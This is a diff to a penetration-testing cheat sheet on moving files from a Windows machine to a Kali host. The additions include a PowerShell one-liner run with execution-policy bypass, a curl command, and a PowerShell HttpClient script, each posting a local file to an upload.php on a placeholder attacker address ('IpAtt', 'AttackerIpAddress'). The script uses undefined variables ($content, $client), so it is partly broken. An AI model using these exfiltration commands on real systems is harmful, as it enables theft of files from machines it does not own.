@@ -13,7 +13,10 @@ systemctl start apache2
 
 ## Upload
 
-source: https://infosecwriteups.com/tip-uploading-files-from-windows-to-kali-using-php-63aadde872a9
+sources: 
+- https://infosecwriteups.com/tip-uploading-files-from-windows-to-kali-using-php-63aadde872a9
+- https://davidhamann.de/2019/04/12/powershell-invoke-webrequest-by-example/
+- https://stackoverflow.com/questions/22491129/how-to-send-multipart-form-data-with-powershell-invoke-restmethod
 
 ### Php on Kali
 
@@ -39,8 +42,24 @@ systemctl start apache2
 
 ```
 powershell -nop -exec bypass Invoke-RestMethod -Uri http://IpAtt/upload.php -Method Post -Infile 'c:\path\to\file.txt'
-
+```
+or
+```
 curl -H Content-Type:"multipart/form-data" --form targetfile=@"c:\path\to\file.txt" -X Post -v http://IpAtt/upload.php
+```
+or
+```
+$fieldName = 'targetfile' # name of the field in upload.php
+$filePath = 'C:\full\path\to\file.txt' # full path...
+$url = 'http://AttackerIpAddress/upload.php'
+
+Add-Type -AssemblyName 'System.Net.Http'
+
+$fileStream = [System.IO.File]::OpenRead($filePath)
+$fileName = [System.IO.Path]::GetFileName($filePath)
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+$content.Add($fileContent, $fieldName, $fileName)
+$result = $client.PostAsync($url, $content).Result
 ```
 
 ### Http on Kali
